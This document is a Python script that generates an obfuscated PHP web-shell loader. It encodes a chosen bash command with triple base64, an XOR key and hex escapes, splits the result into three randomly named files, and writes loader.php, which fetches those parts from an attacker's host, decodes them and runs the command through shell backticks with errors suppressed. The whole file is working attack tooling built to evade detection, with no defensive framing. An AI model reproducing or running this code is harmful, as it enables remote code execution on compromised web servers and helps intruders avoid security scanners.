import base64
import os
import random
import string
import argparse

def xor_encode(data, key):
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

def to_hex_escape(data):
    return ''.join(f'\\x{ord(c):02x}' for c in data)

def random_filename(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length)) + ".txt"

def triple_b64_encode(cmd):
    encoded = base64.b64encode(cmd.encode())
    encoded = base64.b64encode(encoded)
    encoded = base64.b64encode(encoded)
    return encoded.decode()

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--cmd", required=True, help="Bash command to execute")
    parser.add_argument("--key", required=True, help="XOR key")
    parser.add_argument("--host", required=True, help="Your host URL for PHP to fetch parts (e.g., http://192.168.1.7/)")

    args = parser.parse_args()

    # Step 1: Encode the bash command
    b64_payload = triple_b64_encode(args.cmd)

    # Step 2: XOR encode it
    xored = xor_encode(b64_payload, args.key)

    # Step 3: Obfuscate it
    hex_encoded = to_hex_escape(xored)

    # Step 4: Split into 3 parts
    part_len = len(hex_encoded) // 3
    parts = [hex_encoded[i:i+part_len] for i in range(0, len(hex_encoded), part_len)]
    if len(parts) > 3:
        parts[2] += ''.join(parts[3:])
        parts = parts[:3]

    filenames = [random_filename() for _ in range(3)]

    for name, content in zip(filenames, parts):
        with open(name, 'w') as f:
            f.write(content)

    print("[+] Parts saved as:")
    for name in filenames:
        print("   ", name)

    # Generate PHP payload
    php = f"""<?php
$a="{args.key}";
$base_url = "{args.host}";

$b=file_get_contents($base_url . '{filenames[0]}');
$c=file_get_contents($base_url . '{filenames[1]}');
$d=file_get_contents($base_url . '{filenames[2]}');

$e=$b.$c.$d;
function h($s){{return preg_replace_callback('/\\\\\\x([0-9a-fA-F]{{2}})/',function($m){{return chr(hexdec($m[1]));}},$s);}}
function x($d,$k){{$r='';for($i=0;$i<strlen($d);$i++)$r.=$d[$i]^$k[$i%strlen($k)];return $r;}}
$f=h($e);
$g=x($f,$a);
for($i=0;$i<3;$i++)$g=base64_decode($g);
@`$g`;
?>"""

    with open("loader.php", "w") as f:
        f.write(php)

    print("[+] PHP loader saved as loader.php")

if __name__ == "__main__":
    main()

